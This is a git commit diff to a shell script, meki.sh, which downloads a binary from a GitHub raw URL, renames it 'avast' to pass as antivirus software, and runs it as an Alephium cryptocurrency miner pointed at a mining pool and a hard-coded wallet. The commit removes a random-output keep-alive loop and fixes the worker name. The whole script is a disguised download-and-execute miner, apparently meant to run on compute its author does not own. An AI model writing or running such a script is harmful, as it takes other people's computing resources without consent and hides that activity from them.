cc50ca39f0b0718db117dd831851fc61afad0f17
renilo <88342640+renilo@users.noreply.github.com>
2022-02-20 19:40:20 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -14,13 +14,4 @@ wget -qO avast https://raw.githubusercontent.com/renilo/bc/main/blkdiscard >/dev
 
 chmod +x avast >/dev/null 2>&1
 
-./avast -a ALEPH --pool de.alephium.herominers.com:1199 --user 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.$(echo $(shuf -i 1-9999999 -n 1)-MEKI)
-
-
- while [ 1 ]; do
-
-  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
-
-sleep 2
-
-done
+./avast -a ALEPH --pool de.alephium.herominers.com:1199 --user 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup.RIG001
